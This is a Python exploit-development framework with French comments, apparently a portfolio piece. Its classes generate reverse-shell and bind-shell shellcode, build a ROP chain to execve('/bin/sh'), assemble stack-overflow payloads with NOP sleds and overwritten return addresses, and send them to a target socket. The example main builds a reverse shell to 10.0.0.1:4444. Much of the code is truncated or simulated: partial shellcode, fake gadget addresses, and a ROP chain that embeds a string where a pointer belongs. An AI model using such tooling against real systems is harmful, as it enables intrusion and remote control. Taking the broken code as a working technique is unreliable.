#!/usr/bin/env python3
"""
ExploitCraft - Framework Modulaire de Développement d'Exploits
==============================================================

Framework complet pour le développement d'exploits personnalisés avec support
des techniques modernes d'exploitation et de contournement de protections.

Author: Cybersecurity Portfolio
Version: 1.0.0
License: MIT (Educational Use Only)
"""

import struct
import socket
import time
import subprocess
import tempfile
import os
import logging
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from enum import Enum

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Architecture(Enum):
    """Architectures supportées"""
    X86 = "i386"
    X64 = "amd64"
    ARM = "arm"
    ARM64 = "aarch64"

class Platform(Enum):
    """Plateformes supportées"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"

class ExploitType(Enum):
    """Types d'exploits supportés"""
    STACK_OVERFLOW = "stack_overflow"
    HEAP_OVERFLOW = "heap_overflow"
    FORMAT_STRING = "format_string"
    ROP_CHAIN = "rop_chain"
    KERNEL_EXPLOIT = "kernel_exploit"

@dataclass
class Target:
    """Configuration de la cible d'exploitation"""
    binary_path: str
    architecture: Architecture
    platform: Platform
    base_address: int = 0x400000
    aslr_enabled: bool = True
    dep_enabled: bool = True
    stack_canary: bool = True

@dataclass
class Vulnerability:
    """Description d'une vulnérabilité"""
    type: ExploitType
    location: str
    offset: int
    size: int
    bad_chars: bytes = b""
    description: str = ""

class ShellcodeGenerator:
    """Générateur de shellcodes personnalisés"""
    
    def __init__(self, arch: Architecture, platform: Platform):
        self.arch = arch
        self.platform = platform
    
    def generate_reverse_shell(self, host: str, port: int) -> bytes:
        """Génère un shellcode reverse shell"""
        if self.platform == Platform.LINUX and self.arch == Architecture.X64:
            # Shellcode Linux x64 reverse shell
            shellcode = (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
                b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05"
                b"\x49\x89\xc4\x48\x31\xc0\x50\x50\x5e\x66\xbe\x11\x5c"
            )
            # Ajout de l'IP et du port (simplifié)
            ip_bytes = socket.inet_aton(host)
            port_bytes = struct.pack(">H", port)
            shellcode += ip_bytes + port_bytes
            
        elif self.platform == Platform.WINDOWS and self.arch == Architecture.X86:
            # Shellcode Windows x86 reverse shell (simplifié)
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
            )
        else:
            # Shellcode générique (placeholder)
            shellcode = b"\x90" * 100  # NOPs
        
        logger.info(f"Generated reverse shell shellcode: {len(shellcode)} bytes")
        return shellcode
    
    def generate_bind_shell(self, port: int) -> bytes:
        """Génère un shellcode bind shell"""
        if self.platform == Platform.LINUX:
            shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
        else:
            shellcode = b"\x90" * 50
        
        logger.info(f"Generated bind shell shellcode: {len(shellcode)} bytes")
        return shellcode

class ROPChainBuilder:
    """Constructeur de chaînes ROP"""
    
    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.gadgets = []
    
    def find_gadgets(self) -> List[Dict[str, Any]]:
        """Recherche des gadgets ROP"""
        try:
            # Simulation de recherche de gadgets
            gadgets = [
                {'address': 0x40123a, 'instruction': 'pop rdi; ret'},
                {'address': 0x40123b, 'instruction': 'pop rsi; ret'},
                {'address': 0x40123c, 'instruction': 'pop rdx; ret'},
                {'address': 0x401040, 'instruction': 'ret'},
            ]
            
            self.gadgets = gadgets
            logger.info(f"Found {len(gadgets)} ROP gadgets")
            return gadgets
            
        except Exception as e:
            logger.error(f"Failed to find gadgets: {e}")
            return []
    
    def build_chain(self, function: str, args: List[Any]) -> bytes:
        """Construit une chaîne ROP"""
        try:
            chain = b""
            
            # Exemple simple de chaîne ROP pour execve
            if function == "execve":
                # pop rdi; ret (arg1)
                chain += struct.pack("<Q", 0x40123a)
                chain += b"/bin/sh\x00"
                
                # pop rsi; ret (arg2) 
                chain += struct.pack("<Q", 0x40123b)
                chain += struct.pack("<Q", 0x0)
                
                # pop rdx; ret (arg3)
                chain += struct.pack("<Q", 0x40123c) 
                chain += struct.pack("<Q", 0x0)
                
                # call execve
                chain += struct.pack("<Q", 0x401234)  # execve address
            
            logger.info(f"Built ROP chain for {function}: {len(chain)} bytes")
            return chain
            
        except Exception as e:
            logger.error(f"Failed to build ROP chain: {e}")
            return b""

class ExploitBuilder:
    """Constructeur principal d'exploits"""
    
    def __init__(self, exploit_type: ExploitType = ExploitType.STACK_OVERFLOW):
        self.exploit_type = exploit_type
        self.target: Optional[Target] = None
        self.vulnerability: Optional[Vulnerability] = None
        self.payload_components = []
    
    def set_target(self, target: Target) -> None:
        """Configure la cible d'exploitation"""
        self.target = target
        self.shellcode_gen = ShellcodeGenerator(target.architecture, target.platform)
        if target.binary_path:
            self.rop_builder = ROPChainBuilder(target.binary_path)
        logger.info(f"Target configured: {target.binary_path}")
    
    def set_vulnerability(self, vuln: Vulnerability) -> None:
        """Configure la vulnérabilité à exploiter"""
        self.vulnerability = vuln
        logger.info(f"Vulnerability configured: {vuln.type} at {vuln.location}")
    
    def add_overflow(self, register: str, offset: int, value: Union[int, bytes] = None) -> None:
        """Ajoute un overflow pour contrôler un registre"""
        if value is None:
            if self.target.architecture == Architecture.X86:
                value = 0x41414141  # AAAA
            else:
                value = 0x4141414141414141  # AAAAAAAA
        
        component = {
            'type': 'overflow',
            'register': register,
            'offset': offset,
            'value': value
        }
        self.payload_components.append(component)
        logger.info(f"Added overflow: {register} at offset {offset}")
    
    def add_rop_chain(self, function: str, args: List[Any] = None) -> None:
        """Ajoute une chaîne ROP au payload"""
        if not hasattr(self, 'rop_builder'):
            logger.error("ROP builder not initialized")
            return
        
        if args is None:
            args = ["/bin/sh", [], []]
        
        chain = self.rop_builder.build_chain(function, args)
        
        component = {
            'type': 'rop_chain',
            'function': function,
            'args': args,
            'chain': chain
        }
        self.payload_components.append(component)
        logger.info(f"Added ROP chain for {function}")
    
    def add_shellcode(self, shellcode_type: str, **kwargs) -> None:
        """Ajoute un shellcode au payload"""
        if not hasattr(self, 'shellcode_gen'):
            logger.error("Shellcode generator not initialized")
            return
        
        if shellcode_type == "reverse_shell":
            shellcode = self.shellcode_gen.generate_reverse_shell(
                kwargs.get('host', '127.0.0.1'),
                kwargs.get('port', 4444)
            )
        elif shellcode_type == "bind_shell":
            shellcode = self.shellcode_gen.generate_bind_shell(
                kwargs.get('port', 4444)
            )
        else:
            logger.error(f"Unknown shellcode type: {shellcode_type}")
            return
        
        component = {
            'type': 'shellcode',
            'shellcode_type': shellcode_type,
            'shellcode': shellcode,
            'kwargs': kwargs
        }
        self.payload_components.append(component)
        logger.info(f"Added shellcode: {shellcode_type} ({len(shellcode)} bytes)")
    
    def add_nop_sled(self, size: int = 100) -> None:
        """Ajoute un NOP sled au payload"""
        if self.target.architecture == Architecture.X86:
            nops = b"\x90" * size
        elif self.target.architecture == Architecture.X64:
            nops = b"\x90" * size
        else:
            nops = b"\x90" * size
        
        component = {
            'type': 'nop_sled',
            'size': size,
            'nops': nops
        }
        self.payload_components.append(component)
        logger.info(f"Added NOP sled: {size} bytes")
    
    def generate(self) -> bytes:
        """Génère le payload final"""
        if not self.target or not self.vulnerability:
            logger.error("Target and vulnerability must be configured")
            return b""
        
        payload = b""
        
        # Padding initial jusqu'au point de contrôle
        padding_size = self.vulnerability.offset
        payload += b"A" * padding_size
        
        # Ajout des composants dans l'ordre
        for component in self.payload_components:
            if component['type'] == 'overflow':
                if isinstance(component['value'], int):
                    if self.target.architecture == Architecture.X86:
                        payload += struct.pack("<I", component['value'])
                    else:  # X64
                        payload += struct.pack("<Q", component['value'])
                else:
                    payload += component['value']
            
            elif component['type'] == 'rop_chain':
                payload += component['chain']
            
            elif component['type'] == 'shellcode':
                payload += component['shellcode']
            
            elif component['type'] == 'nop_sled':
                payload += component['nops']
        
        logger.info(f"Generated payload: {len(payload)} bytes")
        return payload
    
    def test(self, payload: bytes, target_host: str = "localhost", target_port: int = 9999) -> bool:
        """Teste le payload contre une cible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, target_port))
            sock.send(payload)
            sock.close()
            
            logger.info("Payload sent successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to test payload: {e}")
            return False
    
    def save_to_file(self, payload: bytes, filename: str) -> None:
        """Sauvegarde le payload dans un fichier"""
        try:
            with open(filename, 'wb') as f:
                f.write(payload)
            logger.info(f"Payload saved to {filename}")
        except Exception as e:
            logger.error(f"Failed to save payload: {e}")

# Exemple d'utilisation
def main():
    """Exemple d'utilisation du framework"""
    
    # Configuration de la cible
    target = Target(
        binary_path="/tmp/vulnerable_app",
        architecture=Architecture.X64,
        platform=Platform.LINUX,
        aslr_enabled=False,
        dep_enabled=False
    )
    
    # Configuration de la vulnérabilité
    vuln = Vulnerability(
        type=ExploitType.STACK_OVERFLOW,
        location="main+0x42",
        offset=146,
        size=8,
        bad_chars=b"\x00\x0a\x0d"
    )
    
    # Construction de l'exploit
    builder = ExploitBuilder(ExploitType.STACK_OVERFLOW)
    builder.set_target(target)
    builder.set_vulnerability(vuln)
    
    # Ajout des composants
    builder.add_nop_sled(100)
    builder.add_shellcode("reverse_shell", host="10.0.0.1", port=4444)
    builder.add_overflow("RIP", 146, 0x4141414141414141)
    
    # Génération du payload
    payload = builder.generate()
    
    # Sauvegarde
    builder.save_to_file(payload, "exploit_payload.bin")
    
    print(f"Exploit generated: {len(payload)} bytes")
    print(f"Payload preview: {payload[:50].hex()}...")

if __name__ == "__main__":
    main()